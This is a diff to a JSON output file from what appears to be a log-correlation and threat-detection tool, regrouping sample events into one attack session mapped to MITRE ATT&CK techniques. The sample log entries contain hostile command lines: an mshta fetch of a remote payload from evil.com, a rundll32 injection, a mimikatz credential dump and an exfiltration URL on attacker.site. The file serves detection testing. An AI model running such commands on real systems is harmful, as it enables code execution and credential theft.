@@ -1,324 +1,10 @@
 {
   "summary": "Evaluation completed over log dataset",
   "all_results": {
-    "event": [
-      {
-        "event_type_id": "EVT-013",
-        "event_type": "Remote Code Execution via mshta",
-        "confidence": 0.5,
-        "explanation": "",
-        "schema_version": "v2.0",
-        "mapped_ttps": [
-          {
-            "id": "T1218.005",
-            "score": 0.5,
-            "from": "evaluate_event_type",
-            "mapped_by": "DSL:v1.1"
-          }
-        ],
-        "result": true,
-        "timestamp": "2025-05-20T14:10:10",
-        "source_type": "edr",
-        "vendor": "velociraptor",
-        "process_name": "mshta.exe",
-        "command_line": "mshta http://evil.com/payload.hta",
-        "username": "user01",
-        "src_ip": "192.168.100.10",
-        "dst_ip": "8.8.8.8"
-      },
-      {
-        "event_type_id": "EVT-014",
-        "event_type": "LOLBin Execution via mshta",
-        "confidence": 0.5,
-        "explanation": "",
-        "schema_version": "v2.0",
-        "mapped_ttps": [
-          {
-            "id": "T1218",
-            "score": 0.5,
-            "from": "evaluate_event_type",
-            "mapped_by": "DSL:v1.1"
-          }
-        ],
-        "result": true,
-        "timestamp": "2025-05-20T14:10:10",
-        "source_type": "edr",
-        "vendor": "velociraptor",
-        "process_name": "mshta.exe",
-        "command_line": "mshta http://evil.com/payload.hta",
-        "username": "user01",
-        "src_ip": "192.168.100.10",
-        "dst_ip": "8.8.8.8"
-      },
-      {
-        "event_type_id": "EVT-019",
-        "event_type": "External Connection to Suspicious IP",
-        "confidence": 1.0,
-        "explanation": "",
-        "schema_version": "v2.0",
-        "mapped_ttps": [
-          {
-            "id": "T1071.001",
-            "score": 1.0,
-            "from": "evaluate_event_type",
-            "mapped_by": "DSL:v1.1"
-          }
-        ],
-        "result": true,
-        "timestamp": "2025-05-20T14:10:10",
-        "source_type": "edr",
-        "vendor": "velociraptor",
-        "process_name": "mshta.exe",
-        "command_line": "mshta http://evil.com/payload.hta",
-        "username": "user01",
-        "src_ip": "192.168.100.10",
-        "dst_ip": "8.8.8.8"
-      },
-      {
-        "event_type_id": "EVT-015",
-        "event_type": "ETW Bypass via PowerShell",
-        "confidence": 0.5,
-        "explanation": "",
-        "schema_version": "v2.0",
-        "mapped_ttps": [
-          {
-            "id": "T1620",
-            "score": 0.5,
-            "from": "evaluate_event_type",
-            "mapped_by": "DSL:v1.1"
-          }
-        ],
-        "result": true,
-        "timestamp": "2025-05-20T14:10:15",
-        "source_type": "edr",
-        "vendor": "velociraptor",
-        "process_name": "powershell.exe",
-        "command_line": "powershell -c \"[System.Diagnostics.Eventing.EventProvider]::new()\"",
-        "username": "user01",
-        "src_ip": "192.168.100.10",
-        "dst_ip": "8.8.8.8"
-      },
-      {
-        "event_type_id": "EVT-019",
-        "event_type": "External Connection to Suspicious IP",
-        "confidence": 1.0,
-        "explanation": "",
-        "schema_version": "v2.0",
-        "mapped_ttps": [
-          {
-            "id": "T1071.001",
-            "score": 1.0,
-            "from": "evaluate_event_type",
-            "mapped_by": "DSL:v1.1"
-          }
-        ],
-        "result": true,
-        "timestamp": "2025-05-20T14:10:15",
-        "source_type": "edr",
-        "vendor": "velociraptor",
-        "process_name": "powershell.exe",
-        "command_line": "powershell -c \"[System.Diagnostics.Eventing.EventProvider]::new()\"",
-        "username": "user01",
-        "src_ip": "192.168.100.10",
-        "dst_ip": "8.8.8.8"
-      },
-      {
-        "event_type_id": "EVT-016",
-        "event_type": "Rundll32 Process Injection",
-        "confidence": 0.5,
-        "explanation": "",
-        "schema_version": "v2.0",
-        "mapped_ttps": [
-          {
-            "id": "T1055",
-            "score": 0.5,
-            "from": "evaluate_event_type",
-            "mapped_by": "DSL:v1.1"
-          }
-        ],
-        "result": true,
-        "timestamp": "2025-05-20T14:10:25",
-        "source_type": "edr",
-        "vendor": "velociraptor",
-        "process_name": "rundll32.exe",
-        "command_line": "rundll32 my.dll,Inject",
-        "username": "user01",
-        "src_ip": "192.168.100.10",
-        "dst_ip": "8.8.8.8"
-      },
-      {
-        "event_type_id": "EVT-019",
-        "event_type": "External Connection to Suspicious IP",
-        "confidence": 1.0,
-        "explanation": "",
-        "schema_version": "v2.0",
-        "mapped_ttps": [
-          {
-            "id": "T1071.001",
-            "score": 1.0,
-            "from": "evaluate_event_type",
-            "mapped_by": "DSL:v1.1"
-          }
-        ],
-        "result": true,
-        "timestamp": "2025-05-20T14:10:25",
-        "source_type": "edr",
-        "vendor": "velociraptor",
-        "process_name": "rundll32.exe",
-        "command_line": "rundll32 my.dll,Inject",
-        "username": "user01",
-        "src_ip": "192.168.100.10",
-        "dst_ip": "8.8.8.8"
-      },
-      {
-        "event_type_id": "EVT-017",
-        "event_type": "Credential Access via Mimikatz",
-        "confidence": 0.5,
-        "explanation": "",
-        "schema_version": "v2.0",
-        "mapped_ttps": [
-          {
-            "id": "T1003",
-            "score": 0.5,
-            "from": "evaluate_event_type",
-            "mapped_by": "DSL:v1.1"
-          }
-        ],
-        "result": true,
-        "timestamp": "2025-05-20T14:10:40",
-        "source_type": "edr",
-        "vendor": "velociraptor",
-        "process_name": "mimikatz.exe",
-        "command_line": "sekurlsa::logonpasswords",
-        "username": "user01",
-        "src_ip": "192.168.100.10",
-        "dst_ip": "8.8.8.8"
-      },
-      {
-        "event_type_id": "EVT-019",
-        "event_type": "External Connection to Suspicious IP",
-        "confidence": 1.0,
-        "explanation": "",
-        "schema_version": "v2.0",
-        "mapped_ttps": [
-          {
-            "id": "T1071.001",
-            "score": 1.0,
-            "from": "evaluate_event_type",
-            "mapped_by": "DSL:v1.1"
-          }
-        ],
-        "result": true,
-        "timestamp": "2025-05-20T14:10:40",
-        "source_type": "edr",
-        "vendor": "velociraptor",
-        "process_name": "mimikatz.exe",
-        "command_line": "sekurlsa::logonpasswords",
-        "username": "user01",
-        "src_ip": "192.168.100.10",
-        "dst_ip": "8.8.8.8"
-      },
-      {
-        "event_type_id": "EVT-018",
-        "event_type": "Data Exfiltration via Proxy",
-        "confidence": 0.5,
-        "explanation": "",
-        "schema_version": "v2.0",
-        "mapped_ttps": [
-          {
-            "id": "T1041",
-            "score": 0.5,
-            "from": "evaluate_event_type",
-            "mapped_by": "DSL:v1.1"
-          }
-        ],
-        "result": true,
-        "timestamp": "2025-05-20T14:11:00",
-        "source_type": "proxy",
-        "vendor": "squid",
-        "username": "user01",
-        "src_ip": "192.168.100.10",
-        "url": "http://attacker.site/exfil/data.zip",
-        "status": "TCP_MISS/200",
-        "dst_ip": "8.8.8.8"
-      },
-      {
-        "event_type_id": "EVT-019",
-        "event_type": "External Connection to Suspicious IP",
-        "confidence": 1.0,
-        "explanation": "",
-        "schema_version": "v2.0",
-        "mapped_ttps": [
-          {
-            "id": "T1071.001",
-            "score": 1.0,
-            "from": "evaluate_event_type",
-            "mapped_by": "DSL:v1.1"
-          }
-        ],
-        "result": true,
-        "timestamp": "2025-05-20T14:11:00",
-        "source_type": "proxy",
-        "vendor": "squid",
-        "username": "user01",
-        "src_ip": "192.168.100.10",
-        "url": "http://attacker.site/exfil/data.zip",
-        "status": "TCP_MISS/200",
-        "dst_ip": "8.8.8.8"
-      },
-      {
-        "event_type_id": "EVT-020",
-        "event_type": "HTTP Exfiltration via Proxy",
-        "confidence": 1.0,
-        "explanation": "",
-        "schema_version": "v2.0",
-        "mapped_ttps": [
-          {
-            "id": "T1041",
-            "score": 1.0,
-            "from": "evaluate_event_type",
-            "mapped_by": "DSL:v1.1"
-          }
-        ],
-        "result": true,
-        "timestamp": "2025-05-20T14:11:00",
-        "source_type": "proxy",
-        "vendor": "squid",
-        "username": "user01",
-        "src_ip": "192.168.100.10",
-        "url": "http://attacker.site/exfil/data.zip",
-        "status": "TCP_MISS/200",
-        "dst_ip": "8.8.8.8"
-      },
-      {
-        "event_type_id": "EVT-019",
-        "event_type": "External Connection to Suspicious IP",
-        "confidence": 1.0,
-        "explanation": "",
-        "schema_version": "v2.0",
-        "mapped_ttps": [
-          {
-            "id": "T1071.001",
-            "score": 1.0,
-            "from": "evaluate_event_type",
-            "mapped_by": "DSL:v1.1"
-          }
-        ],
-        "result": true,
-        "timestamp": "2025-05-20T14:10:50",
-        "source_type": "fw",
-        "vendor": "pfsense",
-        "username": "user01",
-        "src_ip": "192.168.100.10",
-        "dst_ip": "8.8.8.8",
-        "dst_port": 443,
-        "protocol": "tcp",
-        "action": "allow"
-      }
-    ],
+    "event": [],
     "session": [
       {
-        "session_id": "f0f81311-e8c8-4c5f-804a-7f270b47bbff",
+        "session_id": "4046abe8-7ea9-43a4-af9f-caf6ff96ead6",
         "session_key": "user01::192.168.100.10::8.8.8.8",
         "events": [
           {
@@ -330,6 +16,74 @@
             "username": "user01",
             "src_ip": "192.168.100.10",
             "dst_ip": "8.8.8.8",
+            "event_type_id": "EVT-013",
+            "event_type": "Remote Code Execution via mshta",
+            "confidence": 0.5,
+            "explanation": "",
+            "schema_version": "v2.0",
+            "mapped_ttps": [
+              {
+                "id": "T1218.005",
+                "score": 0.5,
+                "from": "evaluate_event_type",
+                "mapped_by": "DSL:v1.1"
+              }
+            ],
+            "result": true,
+            "role": "entrypoint",
+            "role_score": 0.9,
+            "role_explanation": "Initial access via mshta"
+          },
+          {
+            "timestamp": "2025-05-20T14:10:10",
+            "source_type": "edr",
+            "vendor": "velociraptor",
+            "process_name": "mshta.exe",
+            "command_line": "mshta http://evil.com/payload.hta",
+            "username": "user01",
+            "src_ip": "192.168.100.10",
+            "dst_ip": "8.8.8.8",
+            "event_type_id": "EVT-014",
+            "event_type": "LOLBin Execution via mshta",
+            "confidence": 0.5,
+            "explanation": "",
+            "schema_version": "v2.0",
+            "mapped_ttps": [
+              {
+                "id": "T1218",
+                "score": 0.5,
+                "from": "evaluate_event_type",
+                "mapped_by": "DSL:v1.1"
+              }
+            ],
+            "result": true,
+            "role": "entrypoint",
+            "role_score": 0.9,
+            "role_explanation": "Initial access via mshta"
+          },
+          {
+            "timestamp": "2025-05-20T14:10:10",
+            "source_type": "edr",
+            "vendor": "velociraptor",
+            "process_name": "mshta.exe",
+            "command_line": "mshta http://evil.com/payload.hta",
+            "username": "user01",
+            "src_ip": "192.168.100.10",
+            "dst_ip": "8.8.8.8",
+            "event_type_id": "EVT-019",
+            "event_type": "External Connection to Suspicious IP",
+            "confidence": 1.0,
+            "explanation": "",
+            "schema_version": "v2.0",
+            "mapped_ttps": [
+              {
+                "id": "T1071.001",
+                "score": 1.0,
+                "from": "evaluate_event_type",
+                "mapped_by": "DSL:v1.1"
+              }
+            ],
+            "result": true,
             "role": "entrypoint",
             "role_score": 0.9,
             "role_explanation": "Initial access via mshta"
@@ -343,6 +97,47 @@
             "username": "user01",
             "src_ip": "192.168.100.10",
             "dst_ip": "8.8.8.8",
+            "event_type_id": "EVT-015",
+            "event_type": "ETW Bypass via PowerShell",
+            "confidence": 0.5,
+            "explanation": "",
+            "schema_version": "v2.0",
+            "mapped_ttps": [
+              {
+                "id": "T1620",
+                "score": 0.5,
+                "from": "evaluate_event_type",
+                "mapped_by": "DSL:v1.1"
+              }
+            ],
+            "result": true,
+            "role": "pivotable",
+            "role_score": 0.75,
+            "role_explanation": "Powershell activity indicating mid-stage logic"
+          },
+          {
+            "timestamp": "2025-05-20T14:10:15",
+            "source_type": "edr",
+            "vendor": "velociraptor",
+            "process_name": "powershell.exe",
+            "command_line": "powershell -c \"[System.Diagnostics.Eventing.EventProvider]::new()\"",
+            "username": "user01",
+            "src_ip": "192.168.100.10",
+            "dst_ip": "8.8.8.8",
+            "event_type_id": "EVT-019",
+            "event_type": "External Connection to Suspicious IP",
+            "confidence": 1.0,
+            "explanation": "",
+            "schema_version": "v2.0",
+            "mapped_ttps": [
+              {
+                "id": "T1071.001",
+                "score": 1.0,
+                "from": "evaluate_event_type",
+                "mapped_by": "DSL:v1.1"
+              }
+            ],
+            "result": true,
             "role": "pivotable",
             "role_score": 0.75,
             "role_explanation": "Powershell activity indicating mid-stage logic"
@@ -356,6 +151,47 @@
             "username": "user01",
             "src_ip": "192.168.100.10",
             "dst_ip": "8.8.8.8",
+            "event_type_id": "EVT-016",
+            "event_type": "Rundll32 Process Injection",
+            "confidence": 0.5,
+            "explanation": "",
+            "schema_version": "v2.0",
+            "mapped_ttps": [
+              {
+                "id": "T1055",
+                "score": 0.5,
+                "from": "evaluate_event_type",
+                "mapped_by": "DSL:v1.1"
+              }
+            ],
+            "result": true,
+            "role": "pivotable",
+            "role_score": 0.75,
+            "role_explanation": "Process injection via rundll32"
+          },
+          {
+            "timestamp": "2025-05-20T14:10:25",
+            "source_type": "edr",
+            "vendor": "velociraptor",
+            "process_name": "rundll32.exe",
+            "command_line": "rundll32 my.dll,Inject",
+            "username": "user01",
+            "src_ip": "192.168.100.10",
+            "dst_ip": "8.8.8.8",
+            "event_type_id": "EVT-019",
+            "event_type": "External Connection to Suspicious IP",
+            "confidence": 1.0,
+            "explanation": "",
+            "schema_version": "v2.0",
+            "mapped_ttps": [
+              {
+                "id": "T1071.001",
+                "score": 1.0,
+                "from": "evaluate_event_type",
+                "mapped_by": "DSL:v1.1"
+              }
+            ],
+            "result": true,
             "role": "pivotable",
             "role_score": 0.75,
             "role_explanation": "Process injection via rundll32"
@@ -369,6 +205,47 @@
             "username": "user01",
             "src_ip": "192.168.100.10",
             "dst_ip": "8.8.8.8",
+            "event_type_id": "EVT-017",
+            "event_type": "Credential Access via Mimikatz",
+            "confidence": 0.5,
+            "explanation": "",
+            "schema_version": "v2.0",
+            "mapped_ttps": [
+              {
+                "id": "T1003",
+                "score": 0.5,
+                "from": "evaluate_event_type",
+                "mapped_by": "DSL:v1.1"
+              }
+            ],
+            "result": true,
+            "role": "pivotable",
+            "role_score": 0.8,
+            "role_explanation": "Credential access via mimikatz"
+          },
+          {
+            "timestamp": "2025-05-20T14:10:40",
+            "source_type": "edr",
+            "vendor": "velociraptor",
+            "process_name": "mimikatz.exe",
+            "command_line": "sekurlsa::logonpasswords",
+            "username": "user01",
+            "src_ip": "192.168.100.10",
+            "dst_ip": "8.8.8.8",
+            "event_type_id": "EVT-019",
+            "event_type": "External Connection to Suspicious IP",
+            "confidence": 1.0,
+            "explanation": "",
+            "schema_version": "v2.0",
+            "mapped_ttps": [
+              {
+                "id": "T1071.001",
+                "score": 1.0,
+                "from": "evaluate_event_type",
+                "mapped_by": "DSL:v1.1"
+              }
+            ],
+            "result": true,
             "role": "pivotable",
             "role_score": 0.8,
             "role_explanation": "Credential access via mimikatz"
@@ -383,6 +260,20 @@
             "dst_port": 443,
             "protocol": "tcp",
             "action": "allow",
+            "event_type_id": "EVT-019",
+            "event_type": "External Connection to Suspicious IP",
+            "confidence": 1.0,
+            "explanation": "",
+            "schema_version": "v2.0",
+            "mapped_ttps": [
+              {
+                "id": "T1071.001",
+                "score": 1.0,
+                "from": "evaluate_event_type",
+                "mapped_by": "DSL:v1.1"
+              }
+            ],
+            "result": true,
             "role": "expansion",
             "role_score": 0.85,
             "role_explanation": "Likely C2 or data exfil via external IP"
@@ -396,6 +287,74 @@
             "url": "http://attacker.site/exfil/data.zip",
             "status": "TCP_MISS/200",
             "dst_ip": "8.8.8.8",
+            "event_type_id": "EVT-018",
+            "event_type": "Data Exfiltration via Proxy",
+            "confidence": 0.5,
+            "explanation": "",
+            "schema_version": "v2.0",
+            "mapped_ttps": [
+              {
+                "id": "T1041",
+                "score": 0.5,
+                "from": "evaluate_event_type",
+                "mapped_by": "DSL:v1.1"
+              }
+            ],
+            "result": true,
+            "role": "expansion",
+            "role_score": 0.9,
+            "role_explanation": "Exfiltration activity via HTTP proxy"
+          },
+          {
+            "timestamp": "2025-05-20T14:11:00",
+            "source_type": "proxy",
+            "vendor": "squid",
+            "username": "user01",
+            "src_ip": "192.168.100.10",
+            "url": "http://attacker.site/exfil/data.zip",
+            "status": "TCP_MISS/200",
+            "dst_ip": "8.8.8.8",
+            "event_type_id": "EVT-019",
+            "event_type": "External Connection to Suspicious IP",
+            "confidence": 1.0,
+            "explanation": "",
+            "schema_version": "v2.0",
+            "mapped_ttps": [
+              {
+                "id": "T1071.001",
+                "score": 1.0,
+                "from": "evaluate_event_type",
+                "mapped_by": "DSL:v1.1"
+              }
+            ],
+            "result": true,
+            "role": "expansion",
+            "role_score": 0.9,
+            "role_explanation": "Exfiltration activity via HTTP proxy"
+          },
+          {
+            "timestamp": "2025-05-20T14:11:00",
+            "source_type": "proxy",
+            "vendor": "squid",
+            "username": "user01",
+            "src_ip": "192.168.100.10",
+            "url": "http://attacker.site/exfil/data.zip",
+            "status": "TCP_MISS/200",
+            "dst_ip": "8.8.8.8",
+            "event_type_id": "EVT-020",
+            "event_type": "HTTP Exfiltration via Proxy",
+            "confidence": 1.0,
+            "explanation": "",
+            "schema_version": "v2.0",
+            "mapped_ttps": [
+              {
+                "id": "T1041",
+                "score": 1.0,
+                "from": "evaluate_event_type",
+                "mapped_by": "DSL:v1.1"
+              }
+            ],
+            "result": true,
             "role": "expansion",
             "role_score": 0.9,
             "role_explanation": "Exfiltration activity via HTTP proxy"
@@ -403,16 +362,16 @@
         ],
         "start_time": "2025-05-20T14:10:10",
         "end_time": "2025-05-20T14:11:00",
-        "role_sequence": "entrypoint → pivotable → pivotable → pivotable → expansion → expansion",
+        "role_sequence": "entrypoint → entrypoint → entrypoint → pivotable → pivotable → pivotable → pivotable → pivotable → pivotable → expansion → expansion → expansion → expansion",
         "role_summary": {
-          "entrypoint": 1,
-          "pivotable": 3,
-          "expansion": 2
+          "entrypoint": 3,
+          "pivotable": 6,
+          "expansion": 4
         },
-        "ttp_chain": "",
-        "unique_ttp_count": 0,
-        "confidence": 0.0,
-        "summary": "0 unique TTPs chained",
+        "ttp_chain": "T1218.005 → T1218 → T1071.001 → T1620 → T1055 → T1003 → T1041",
+        "unique_ttp_count": 7,
+        "confidence": 1.429,
+        "summary": "7 unique TTPs chained",
         "schema_version": "v0.1"
       }
     ],
